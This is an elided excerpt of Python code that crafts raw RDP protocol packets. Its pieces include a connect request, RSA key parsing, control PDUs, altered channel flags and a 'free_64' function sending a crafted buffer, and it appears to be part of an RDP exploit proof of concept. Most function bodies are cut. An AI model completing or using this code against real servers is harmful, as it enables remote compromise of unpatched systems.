...
def connect_req(name):
    ...
    packet = binascii.unhexlify(
        '0300002e29e00000000000436f6f6b69653a206d737473686173683d')
    packet += name  # 1
...
def parse_mcs_conn_resp(packet):
    ...
    rsa_pub_mod = int.from_bytes(
        server_cert[20:20+key_len], byteorder='little')
...
def client_cooperate(crypter):
    ...
    packet = binascii.unhexlify(
        '1a001700ee03ea03010000010c00140000000400000000000000')
...
def client_control_req(crypter):
    ...
    packet = binascii.unhexlify(
        '1a001700ee03ea03010000010c00140000000100000000000000')
...
def client_persistent_key_len(crypter):
    ...
    packet = binascii.unhexlify(
        '22001700ee03ea030100000114001c00000001000000000000000000000000000000')
...
def client_font_list(crypter):
    ...
    packet = binascii.unhexlify(
        '1a001700ee03ea03010000010c00270000000000000003003200')
...
#    channel_pdu_flags = binascii.unhexlify('03000000') # original
    ...
    channel_pdu_hdr = struct.pack(
        '<I', len(virt_chan_data)) + channel_pdu_flags
...
def free_64(crypter):
    ...
    to_send = binascii.unhexlify(
        '00000000000000000200000000000000000000000000000000000000000000005A5A')
...
def parse_data(crypter, data):
    ...
    print('data from %d to channel id = %d' % (int.from_bytes(
        initiator, byteorder='big'), int.from_bytes(channel_id, byteorder='big')))
